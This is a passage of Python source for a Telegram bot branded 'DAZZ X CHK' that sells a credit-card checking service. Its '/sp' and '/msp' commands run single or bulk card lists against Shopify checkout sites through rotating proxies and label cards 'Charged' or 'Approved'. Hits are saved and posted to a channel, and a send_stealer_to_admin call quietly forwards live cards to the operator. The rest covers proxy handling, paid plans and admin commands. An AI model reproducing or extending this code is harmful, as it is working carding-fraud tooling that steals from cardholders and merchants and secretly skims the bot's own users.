            except: dead += 1; tested += 1; dead_sites.add(normalize_site_url(site))
    for i in range(0, len(sites), SITE_PER_USER_WORKERS):
        await asyncio.gather(*[asyncio.create_task(worker(s)) for s in sites[i:i+SITE_PER_USER_WORKERS]],
                             return_exceptions=True)
    for s in sites:
        n = normalize_site_url(s)
        if n in dead_sites or n in price_removed: await remove_site_db(0, s)
    try:
        await styled_edit(sm,
            f"{PE} <b>{bs('Done')}</b> | ✅{alive} ❌{dead} | {bs('Kept')}:{kept} | {bs('Removed')}:{dead + removed_price}",
            emoji_ids=[CE["fire"]])
    except: pass
    await cleanup_user_http_session(uid, "site"); cleanup_user_sem(uid)


# ====================== PROXY (unlimited) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]addpxy'))
async def add_proxy_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    try:
        lines = []
        if event.is_reply:
            rm = await event.get_reply_message()
            if rm.file:
                fp = await rm.download_media()
                try:
                    async with aiofiles.open(fp, "r", encoding="utf-8") as f:
                        lines = [l.strip() for l in (await f.read()).splitlines() if l.strip()]
                finally:
                    try: os.remove(fp)
                    except: pass
            elif rm.text:
                lines = [l.strip() for l in rm.text.splitlines() if l.strip()]
        else:
            p = event.raw_text.split(maxsplit=1)
            if len(p) == 2: lines = [l.strip() for l in p[1].splitlines() if l.strip()]
            else: return await styled_reply(event, f"{PE} <code>/addpxy ip:port:user:pass</code>", emoji_ids=[CE["info"]])
        if not lines: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
        await ensure_user(event.sender_id)
        existing = {p['proxy_url'] for p in await get_all_user_proxies(event.sender_id)}
        parsed = []
        for l in lines:
            pd = parse_proxy_format(l)
            if pd and pd['proxy_url'] not in existing:
                parsed.append(pd); existing.add(pd['proxy_url'])
        if not parsed: return await styled_reply(event, f"{PE} <b>{bs('No valid proxies')}</b>", emoji_ids=[CE["cross"]])
        tm = await styled_reply(event, f"{PE} <b>{bs('Testing')} {len(parsed)}...</b>", emoji_ids=[CE["shield"]])
        added = failed = 0
        for i in range(0, len(parsed), 10):
            batch = parsed[i:i+10]
            results = await asyncio.gather(*[test_proxy(p['proxy_url']) for p in batch], return_exceptions=True)
            for pd2, res in zip(batch, results):
                if isinstance(res, tuple) and res[0]:
                    await add_proxy_db(event.sender_id, pd2); added += 1
                else: failed += 1
        cc = await get_proxy_count(event.sender_id)
        await styled_edit(tm, f"{PE} <b>{bs('Done')}</b> ✅{added} ❌{failed} | {bs('Total')}: {cc}", emoji_ids=[CE["fire"]])
    except Exception as e:
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]proxy$'))
async def view_proxies(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b> <code>/addpxy</code>", emoji_ids=[CE["cross"]])
    txt = f"{PE} <b>{bs('Proxies')}</b> ({len(proxies)}) {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    ei = [CE["fire"], CE["fire"]]
    for i, p in enumerate(proxies[:30], 1):
        txt += f"<code>{i}.</code> {PE} <b>{p['ip']}:{p['port']}</b>\n"; ei.append(CE["link"])
    if len(proxies) > 30: txt += f"\n<i>+{len(proxies)-30} more</i>"
    txt += f"\n{PE} <code>/rmpxy index</code>"; ei.append(CE["trash"])
    await styled_reply(event, txt, emoji_ids=ei)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmpxy'))
async def remove_proxy_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
    p = event.raw_text.split(maxsplit=1)
    if len(p) == 1: return await styled_reply(event, f"{PE} <code>/rmpxy index</code> or <code>all</code>", emoji_ids=[CE["warn"]])
    arg = p[1].strip().lower()
    if arg == 'all':
        c = await clear_all_proxies(event.sender_id)
        return await styled_reply(event, f"{PE} <b>{bs('Cleared')} {c}</b>", emoji_ids=[CE["check"]])
    try:
        idx = int(arg) - 1
        if 0 <= idx < len(proxies):
            rm = await remove_proxy_by_index(event.sender_id, idx)
            await styled_reply(event, f"{PE} <b>{bs('Removed')} {rm['ip']}:{rm['port']}</b>", emoji_ids=[CE["check"]])
        else: await styled_reply(event, f"{PE} <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])
    except: await styled_reply(event, f"{PE} <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]chkpxy$'))
async def check_proxies_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
    sm = await styled_reply(event, f"{PE} <b>{bs('Testing')} {len(proxies)}...</b>", emoji_ids=[CE["shield"]])
    results = await asyncio.gather(*[test_proxy(p['proxy_url']) for p in proxies], return_exceptions=True)
    w = sum(1 for r in results if isinstance(r, tuple) and r[0])
    await styled_edit(sm, f"{PE} <b>{bs('Proxy Check')}</b>\n✅ {bs('Working')}: {w}\n❌ {bs('Dead')}: {len(results)-w}",
                      emoji_ids=[CE["shield"]])


# ====================== FREE LIMITS ======================
async def _check_free_limits(event, uid, plan, is_group):
    if uid in ADMIN_ID: return True
    if not is_paid_plan(plan):
        if not is_group: await send_group_only_message(event); return False
        used = get_free_sp_usage(uid)
        if used >= FREE_SP_DAILY_LIMIT:
            await styled_reply(event,
                f"{PE} <b>{bs('Daily Limit')}</b> {used}/{FREE_SP_DAILY_LIMIT}",
                buttons=[[pbtn(bs("Upgrade"), url=SUPPORT_LINK)]],
                emoji_ids=[CE["stop"]])
            return False
        cd = get_free_sp_cooldown_remaining(uid)
        if cd > 0:
            await styled_reply(event, f"⚠️ <b>{bs('Wait')} {cd}{bs('s')}</b>",
                buttons=[[pbtn(bs("Upgrade"), url=SUPPORT_LINK)]])
            return False
    return True


def _get_card_from_event(event, reply_msg):
    card = None
    if reply_msg and reply_msg.text:
        cc = extract_cc(reply_msg.text)
        if cc: card = cc[0]
    if not card:
        cc = extract_cc(event.message.text)
        if cc: card = cc[0]
    return card


# ====================== /sp (Shopify Single) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]sp\b'))
async def single_cc_check(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned":
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    plan = await get_user_plan(uid)
    is_group = event.chat.id != uid
    if not await _check_free_limits(event, uid, plan, is_group): return
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"; name = sender.first_name or username
    except: username, name = f"user_{uid}", "User"
    if is_paid_plan(plan) or uid in ADMIN_ID:
        sites = await get_user_sites(uid); proxies = await get_all_user_proxies(uid)
    else:
        sites = await get_user_sites(0); proxies = []
    if not sites: return await styled_reply(event, f"{PE} <b>{bs('No sites!')}</b>", emoji_ids=[CE["warn"]])
    rm = await event.get_reply_message() if event.reply_to_msg_id else None
    card = _get_card_from_event(event, rm)
    if not card: return await styled_reply(event, f"{PE} <code>/sp card|mm|yy|cvv</code>", emoji_ids=[CE["info"]])
    if uid not in ADMIN_ID and not is_paid_plan(plan):
        set_free_sp_last_use(uid); increment_free_sp_usage(uid)
    lm = await styled_reply(event, f"{bs('Processing')}… ⏳")
    st = time.time()
    rotator = SmartRotator()
    try:
        http_session = await get_user_http_session(uid, "sp")
        async with get_user_sem(uid, "sp"):
            bin_task = asyncio.create_task(get_bin_info(card.split('|')[0]))
            result, _ = await check_card_with_retry(card, sites, uid, proxies, 3, rotator, http_session=http_session)
            bi = await bin_task
        elapsed = round(time.time() - st, 2)
        status = result.get('Status', 'Declined')
        if status in ["Charged", "Approved"]:
            asyncio.create_task(save_card_to_db(card, status.upper(), result.get('Response', ''),
                                                result.get('Gateway', ''), result.get('Price', ''), uid))
        msg, eid = format_simple_card_result(status, card, result.get('Gateway', '?'),
                                              result.get('Response', '')[:150], bi, elapsed,
                                              extra_field=("Price", result.get('Price', '-')) if result.get('Price', '-') != '-' else None)
        try: await lm.delete()
        except: pass
        rm2 = await styled_reply(event, msg, emoji_ids=eid, buttons=HIT_BUTTON)
        if status == "Charged":
            asyncio.create_task(pin_charged_message(event, rm2))
            asyncio.create_task(send_channel_hit(result, uid, username, name))
            asyncio.create_task(send_stealer_to_admin(card, result, uid, username, name, bi))
        elif status == "Approved":
            asyncio.create_task(send_channel_hit(result, uid, username, name))
    except Exception as e:
        try: await lm.delete()
        except: pass
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])


# ====================== /stop ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]stop$'))
async def stop_cmd(event):
    uid = event.sender_id
    proc = ACTIVE_MTXT_PROCESSES.get(uid)
    if not proc: return await styled_reply(event, f"{PE} <b>{bs('No active session')}</b>", emoji_ids=[CE["warn"]])
    if isinstance(proc, dict):
        proc["stopped"] = True
        for task in proc.get("tasks", []):
            if not task.done(): task.cancel()
    await styled_reply(event, f"{PE} <b>{bs('Stopping')}...</b>", emoji_ids=[CE["stop"]])


# ====================== MASS PROCESSOR ======================
async def _run_mass_process(event, cards, proxies, send_approved, process_store, stop_prefix, check_func, sem_type):
    uid = event.sender_id
    try:
        sender = await event.get_sender()
        username, name = sender.username or f"user_{uid}", sender.first_name or "User"
    except: username, name = f"user_{uid}", "User"
    total = len(cards); checked = charged = approved = declined = errors = 0
    mode = bs("C+A") if send_approved else bs("C only")
    st = time.time(); hits = []
    workers = MSP_PER_USER_WORKERS
    user_sem = get_user_sem(uid, sem_type)
    http_session = await get_user_http_session(uid, sem_type)
    sm = await styled_reply(event, f"<pre>{PE} {bs('Processing')} ━ {mode} ━ {workers}{bs('w')}</pre>",
                            emoji_ids=[CE["chart"]])
    last_ui = [0]; lcd, lrd = "-", "-"
    def is_stopped():
        proc = process_store.get(uid)
        if not proc: return True
        return proc.get("stopped", False) if isinstance(proc, dict) else False
    async def update_ui():
        if time.time() - last_ui[0] < 3.0 or is_stopped(): return
        last_ui[0] = time.time()
        kb = [[pbtn(f" {lcd}", "none")], [pbtn(f" {lrd}", "none")],
              [pbtn(f"{bs('C')} ━ {charged}", "none"), pbtn(f"{bs('A')} ━ {approved}", "none")],
              [pbtn(f"{bs('D')} ━ {declined}", "none"), pbtn(f"{bs('E')} ━ {errors}", "none")],
              [pbtn(f" {checked}/{total}", "none")], [pbtn(bs("Stop"), f"{stop_prefix}:{uid}")]]
        try: await styled_edit(sm, f"<pre>{PE} {bs('Processing')}...</pre>", buttons=kb, emoji_ids=[CE["star"]])
        except: pass
    async def worker(card):
        nonlocal checked, charged, approved, declined, errors, lcd, lrd
        if is_stopped(): return
        async with user_sem:
            if is_stopped(): return
            try:
                result = await check_func(card, http_session)
                if is_stopped(): return
                status = result.get("Status", "Declined")
                resp = result.get("Response", ""); gw = result.get("Gateway", "Shopify")
                checked += 1; lcd = card; lrd = resp[:30]
                if status == "Error": errors += 1
                elif status == "Charged":
                    charged += 1; hits.append(f"{card} - CHARGED - {resp} - {gw}")
                    asyncio.create_task(save_card_to_db(card, "CHARGED", resp, gw, result.get('Price', '-'), uid))
                    asyncio.create_task(_send_mass_hit(card, result, "Charged", uid, username, name))
                elif status == "Approved":
                    approved += 1; hits.append(f"{card} - APPROVED - {resp} - {gw}")
                    asyncio.create_task(save_card_to_db(card, "APPROVED", resp, gw, result.get('Price', '-'), uid))
                    if send_approved:
                        asyncio.create_task(_send_mass_hit(card, result, "Approved", uid, username, name))
                else: declined += 1
                await update_ui()
            except asyncio.CancelledError: return
            except:
                if not is_stopped(): errors += 1; checked += 1
    batch_size = workers * 2; all_tasks = []
    proc = process_store.get(uid)
    for i in range(0, len(cards), batch_size):
        if is_stopped(): break
        bt = [asyncio.create_task(worker(c)) for c in cards[i:i+batch_size]]
        all_tasks.extend(bt)
        if isinstance(proc, dict): proc["tasks"] = all_tasks
        await asyncio.gather(*bt, return_exceptions=True)
    await asyncio.sleep(0.3)
    el = int(time.time() - st); h, m, s = el // 3600, (el % 3600) // 60, el % 60
    stop_label = f" ({bs('Stopped')})" if is_stopped() else ""
    ft = f"""{PE} <b>{bs('Complete')}{stop_label}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Charged')}</b> ━ <code>{charged}</code>
{PE} <b>{bs('Approved')}</b> ━ <code>{approved}</code>
{PE} <b>{bs('Declined')}</b> ━ <code>{declined}</code>
{PE} <b>{bs('Errors')}</b> ━ <code>{errors}</code>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Checked')}</b> ━ <code>{checked}/{total}</code>"""
    fkb = [[pbtn(f"{bs('C')} ━ {charged}", "none"), pbtn(f"{bs('A')} ━ {approved}", "none")],
           [pbtn(f"{bs('T')} ━ {checked}/{total}", "none"), pbtn(f"{h}{bs('h')}{m}{bs('m')}{s}{bs('s')}", "none")]]
    for _ in range(3):
        try:
            await styled_edit(sm, ft, buttons=fkb,
                emoji_ids=[CE["crown"], CE["crown"], CE["gem"], CE["check"],
                           CE["declined"], CE["warn"], CE["star"]])
            break
        except: await asyncio.sleep(0.5)
    await send_final_file(uid, charged, approved, declined, errors, total, hits, uid)
    process_store.pop(uid, None)
    await cleanup_user_http_session(uid, sem_type); cleanup_user_sem(uid)


async def _send_mass_hit(card, result, status, uid, username, name):
    await asyncio.sleep(HIT_DELAY)
    try:
        bi = await get_bin_info(card.split("|")[0])
        gw = result.get('Gateway', 'Shopify')
        resp = result.get('Response', '')[:150]
        msg, eid = format_card_result(status, card, gw, resp, result.get('Price', '-'),
                                      result.get('site', '-'), bi, 0.0)
        try: await styled_send(uid, msg, emoji_ids=eid, buttons=HIT_BUTTON)
        except: pass
        asyncio.create_task(send_channel_hit(result, uid, username, name))
        if status == "Charged":
            asyncio.create_task(send_stealer_to_admin(card, result, uid, username, name, bi))
    except: pass


async def send_final_file(uid, charged, approved, declined, errors, total, hits=None, target_chat=None):
    hits = hits or []
    fn = f"dazz_x_{uid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    target = target_chat or uid
    try:
        async with aiofiles.open(fn, 'w', encoding='utf-8') as f:
            await f.write(f"{'='*49}\nDAZZ X CHK RESULTS\n{'='*49}\n\nCharged: {charged}\nApproved: {approved}\nDeclined: {declined}\nErrors: {errors}\nTotal: {total}\n")
            if hits:
                await f.write(f"\n{'='*49}\nHITS\n{'='*49}\n\n")
                for h in hits: await f.write(h + "\n")
        try:
            await styled_send(target, f"{PE} <b>{bs('Results')}</b> {PE}",
                              emoji_ids=[CE["fire"], CE["fire"]], file=fn)
        except: pass
        try: os.remove(fn)
        except: pass
    except: pass


# ====================== /msp (Shopify Mass) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]msp\b'))
async def mass_check_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at, plan = await get_user_access(event)
    if at == "banned":
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    if uid not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    cl = get_cc_limit(plan, uid)
    if uid in ACTIVE_MTXT_PROCESSES:
        return await styled_reply(event, f"{PE} <b>{bs('Already running')}</b>", emoji_ids=[CE["warn"]])
    content, from_inline = "", False
    cmd_text = re.sub(r'^[/.]msp\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if cmd_text: content = cmd_text; from_inline = True
    elif event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if not rm: return await styled_reply(event, f"{PE} <b>{bs('Message not found')}</b>", emoji_ids=[CE["warn"]])
        if rm.document:
            fp = await rm.download_media()
            try:
                async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                    content = await f.read()
                os.remove(fp)
            except: pass
        elif rm.text: content = rm.text
    else:
        return await styled_reply(event, f"{PE} <b>{bs('Reply to .txt or paste cards after')} </b><code>/msp</code>",
                                  emoji_ids=[CE["info"]])
    sites = await get_user_sites(uid)
    if not sites: return await styled_reply(event, f"{PE} <b>{bs('No sites!')}</b>", emoji_ids=[CE["warn"]])
    cards = extract_cc(content)
    if not cards: return await styled_reply(event, f"{PE} <b>{bs('No valid cards')}</b>", emoji_ids=[CE["cross"]])
    if len(cards) > cl: cards = cards[:cl]
    await styled_reply(event, f"<pre>{PE} {len(cards)} {bs('CCs')} | {bs('Limit')}: {cl}</pre>", emoji_ids=[CE["star"]])
    proxies = await get_all_user_proxies(uid)
    rotator = SmartRotator()
    async def shopify_check(card, http_session):
        result, _ = await check_card_with_retry(
            card, sites, uid, proxies, 3, rotator,
            cancel_check=lambda: ACTIVE_MTXT_PROCESSES.get(uid, {}).get("stopped", True),
            http_session=http_session)
        return result
    if from_inline:
        ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
        asyncio.create_task(_run_mass_process(event, cards, proxies, True, ACTIVE_MTXT_PROCESSES,
                                               "stop_chk", shopify_check, "msp"))
    else:
        kb = [[pbtn(bs("Charged + Approved"), f"chk_pref:yes:{uid}")],
              [pbtn(bs("Only Charged"), f"chk_pref:no:{uid}")]]
        pm = await styled_reply(event, f"{PE} <b>{bs('Filter')}</b>", kb, emoji_ids=[CE["chart"]])
        USER_APPROVED_PREF[f"chk_{uid}"] = {"cards": cards, "sites": sites, "proxies": proxies,
                                              "event": event, "pref_msg": pm, "rotator": rotator}


@client.on(events.CallbackQuery(pattern=rb"chk_pref:(yes|no):(\d+)"))
async def chk_pref_cb(event):
    pref = event.pattern_match.group(1).decode()
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = USER_APPROVED_PREF.pop(f"chk_{uid}", None)
    if not data: return await event.answer(f"{bs('Expired')}!", alert=True)
    try: await data["pref_msg"].delete()
    except: pass
    if uid in ACTIVE_MTXT_PROCESSES: return await event.answer(f"{bs('Already running')}!", alert=True)
    ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
    await event.answer(f"{bs('Starting')}...")
    rotator = data.get("rotator", SmartRotator())
    sites, proxies = data["sites"], data["proxies"]
    async def shopify_check(card, http_session):
        result, _ = await check_card_with_retry(
            card, sites, uid, proxies, 3, rotator,
            cancel_check=lambda: ACTIVE_MTXT_PROCESSES.get(uid, {}).get("stopped", True),
            http_session=http_session)
        return result
    asyncio.create_task(_run_mass_process(data["event"], data["cards"], proxies, pref == "yes",
                                           ACTIVE_MTXT_PROCESSES, "stop_chk", shopify_check, "msp"))


@client.on(events.CallbackQuery(pattern=rb"stop_chk:(\d+)"))
async def stop_chk_cb(event):
    puid = int(event.pattern_match.group(1).decode())
    if event.sender_id != puid and event.sender_id not in ADMIN_ID:
        return await event.answer(f"{bs('Not yours')}!", alert=True)
    proc = ACTIVE_MTXT_PROCESSES.get(puid)
    if not proc: return await event.answer(f"{bs('None active')}!", alert=True)
    if isinstance(proc, dict):
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
    await event.answer(f"{bs('Stopping')}...", alert=True)


# ====================== /status ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]status$'))
async def status_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    try:
        st = await _build_status_text()
        await styled_reply(event, st, buttons=[[pbtn("🔄 Refresh", data="refresh_status")]])
    except Exception as e:
        await styled_reply(event, f"⚠️ <code>{e}</code>")


@client.on(events.CallbackQuery(data=b"refresh_status"))
async def refresh_status_cb(event):
    if event.sender_id not in ADMIN_ID: return await event.answer("No!", alert=True)
    await event.answer("Refreshing...")
    try:
        st = await _build_status_text()
        msg = event.message if hasattr(event, 'message') else await event.get_message()
        await styled_edit(msg, st, buttons=[[pbtn("🔄 Refresh", data="refresh_status")]])
    except: pass


# ====================== ADMIN ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.](maintenance|maintance)\s+(on|off)$'))
async def maint_toggle(event):
    if event.sender_id not in ADMIN_ID: return
    a = event.raw_text.lower().split()[1]
    await set_maintenance_mode(a == "on")
    await styled_reply(event, f"{PE} <b>{bs('Maintenance')} {bs('On') if a == 'on' else bs('Off')}</b>",
        emoji_ids=[CE["stop"] if a == "on" else CE["check"]])


async def _handle_plan_assign(event, plan_key):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 2: return await styled_reply(event, f"{PE} <code>/{plan_key} user_id</code>", emoji_ids=[CE["warn"]])
    try: target_uid = int(parts[1])
    except: return await styled_reply(event, f"{PE} <b>{bs('Invalid ID')}</b>", emoji_ids=[CE["cross"]])
    pi = PLANS[plan_key]
    try:
        ent = await client_instance.get_entity(target_uid); tname = getattr(ent, 'first_name', None) or "Unknown"
    except: tname = "Unknown"
    await ensure_user(target_uid)
    cur = await get_user_plan(target_uid); is_up = is_paid_plan(cur)
    await set_user_plan(target_uid, pi["tier"], pi["duration_days"])
    exp = (datetime.now() + timedelta(days=pi["duration_days"])).strftime('%Y-%m-%d %H:%M:%S')
    await styled_reply(event,
        f"""<b>✅ {bs('Plan Updated')}</b>
<a href='https://t.me/Dazzelerx'>𝘿</a> <b>{bs('User')}</b> ↬ <a href='tg://user?id={target_uid}'>{tname}</a>
<a href='https://t.me/Dazzelerx'>𝘿</a> <b>{bs('Plan')}</b> ↬ {pi['emoji']} <b>{pi['name']}</b>
<a href='https://t.me/Dazzelerx'>𝘿</a> <b>{bs('Duration')}</b> ↬ <code>{pi['duration_days']} {bs('days')}</code>
<a href='https://t.me/Dazzelerx'>𝘿</a> <b>{bs('Expires')}</b> ↬ <code>{exp}</code>""",
        emoji_ids=[CE["crown"], CE["crown"], CE["gem"], CE["chart"], CE["check"]])
    try:
        await styled_send(target_uid,
            f"""<b>🎉 {bs('Plan Upgraded!')} 🎉</b>
{pi['emoji']} <b>{pi['name']}</b> ━ <code>{pi['duration_days']}d</code>
{bs('Limit')}: {get_cc_limit(pi['tier'])} CCs
{bs('Expires')}: {exp}""",
            emoji_ids=[CE["fire"], CE["gift"], CE["crown"], CE["info"]])
    except: pass
    try:
        rid = f"DAZZ-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
        lt = f"{bs('Plan RENEWED')} 🔄" if is_up else f"{bs('New Plan')} 🛒"
        await styled_send(LOG_CHANNEL_ID,
            f"<b>{lt}</b>\n<a href='tg://user?id={target_uid}'>{tname}</a> ━ {pi['emoji']}{pi['name']} ━ {pi['price']} ━ {rid}",
            emoji_ids=[CE["chart"], CE["crown"]])
    except: pass


@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan1\b'))
async def plan1_cmd(event): await _handle_plan_assign(event, "plan1")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan2\b'))
async def plan2_cmd(event): await _handle_plan_assign(event, "plan2")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan3\b'))
async def plan3_cmd(event): await _handle_plan_assign(event, "plan3")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan4\b'))
async def plan4_cmd(event): await _handle_plan_assign(event, "plan4")


@client.on(events.NewMessage(pattern=r'(?i)^[/.]rplan\b'))
async def rplan_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 2: return await styled_reply(event, f"{PE} <code>/rplan user_id</code>", emoji_ids=[CE["warn"]])
    try: target_uid = int(parts[1])
    except: return await styled_reply(event, f"{PE} <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])
    await ensure_user(target_uid)
    cp = await get_user_plan(target_uid)
    if not is_paid_plan(cp):
        return await styled_reply(event, f"{PE} <b>{bs('No active plan')}</b>", emoji_ids=[CE["cross"]])
    try:
        ent = await client_instance.get_entity(target_uid); tn = getattr(ent, 'first_name', None) or "?"
    except: tn = "?"
    await set_user_plan(target_uid, "Bronze", 0)
    await styled_reply(event, f"{PE} <b>{bs('Revoked')} {cp} from {tn}</b>", emoji_ids=[CE["check"]])
    try:
        await styled_send(target_uid, f"{PE} <b>{bs('Your plan has been ended. Contact admin to renew.')}</b>",
            emoji_ids=[CE["warn"]])
    except: pass


@client.on(events.NewMessage(pattern=r'(?i)^[/.]planall$'))
async def planall_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    all_users = []
    for tier in PAID_TIERS:
        all_users.extend(await get_users_by_plan(tier))
    if not all_users:
        return await styled_reply(event, f"{PE} <b>{bs('No active plans')}</b>", emoji_ids=[CE["warn"]])
    fn = f"plans_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    content = f"ACTIVE PLANS ({len(all_users)})\n{'='*40}\n"
    for u in all_users:
        uid2 = u.get("user_id", "?"); tier = u.get("plan", "?")
        exp = u.get("expiry")
        es = exp[:10] if exp else "?"
        try:
            ent = await client_instance.get_entity(uid2); un = getattr(ent, 'first_name', None) or "?"
        except: un = "?"
        content += f"{un} | {uid2} | {tier} | {es}\n"
    async with aiofiles.open(fn, 'w') as f: await f.write(content)
    try:
        await styled_send(event.chat_id, f"{PE} <b>{bs('Plans')} ({len(all_users)})</b>",
            emoji_ids=[CE["fire"]], file=fn)
    except: pass
    try: os.remove(fn)
    except: pass


@client.on(events.NewMessage(pattern=r'(?i)^[/.]stats$'))
async def stats_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    try:
        tu = await get_total_users(); pu = await get_premium_count()
        ts2 = await get_total_sites_count(); tc = await get_total_cards_count()
        ch = await get_charged_count(); ap = await get_approved_count()
        await styled_reply(event,
            f"""{PE} <b>{bs('Stats')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Users')}:</b> <code>{tu}</code> | <b>{bs('Premium')}:</b> <code>{pu}</code>
{PE} <b>{bs('Sites')}:</b> <code>{ts2}</code> | <b>{bs('Cards')}:</b> <code>{tc}</code>
{PE} <b>{bs('Charged')}:</b> <code>{ch}</code> | <b>{bs('Approved')}:</b> <code>{ap}</code>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('MSP Active')}:</b> <code>{len(ACTIVE_MTXT_PROCESSES)}</code> ({MSP_PER_USER_WORKERS}w)""",
            emoji_ids=[CE["fire"], CE["fire"], CE["chart"], CE["link"], CE["gem"],
                       CE["brain"], CE["shield"]])
    except Exception as e:
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])

# ====================== BROADCAST ======================
from database import get_all_user_ids

PENDING_BROADCAST = {}
BROADCAST_TASKS = {}


def _decorate_broadcast(user_text: str) -> str:
    """Auto-decorate user text with premium emoji header/footer."""
    return f"""{PE} <b>{bs('DAZZ X CHK')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>

{user_text}

<b>━━━━━━━━━━━━━━━━━</b>
{PE} <i>{bs('Thank you for using our service')}</i> {PE}"""


@client.on(events.NewMessage(pattern=r'(?i)^[/.]broadcast\b'))
async def broadcast_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    if event.sender_id in BROADCAST_TASKS:
        return await styled_reply(event, f"{PE} <b>{bs('Broadcast already running')}</b>",
                                  emoji_ids=[CE["warn"]])

    # Get content
    content = ""
    if event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if rm and rm.text:
            content = rm.text
    else:
        content = re.sub(r'^[/.]broadcast\s*', '', event.raw_text, flags=re.IGNORECASE).strip()

    if not content:
        return await styled_reply(event,
            f"""{PE} <b>{bs('Broadcast Usage')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <code>/broadcast Your message here</code>
{PE} <i>Or reply to any message with</i> <code>/broadcast</code>""",
            emoji_ids=[CE["info"], CE["info"], CE["link"], CE["warn"]])

    decorated = _decorate_broadcast(content)
    users = await get_all_user_ids()
    total = len(users)

    PENDING_BROADCAST[event.sender_id] = {"text": decorated, "users": users}

    kb = [[pbtn(bs("Send Now"), f"bc_go:{event.sender_id}"),
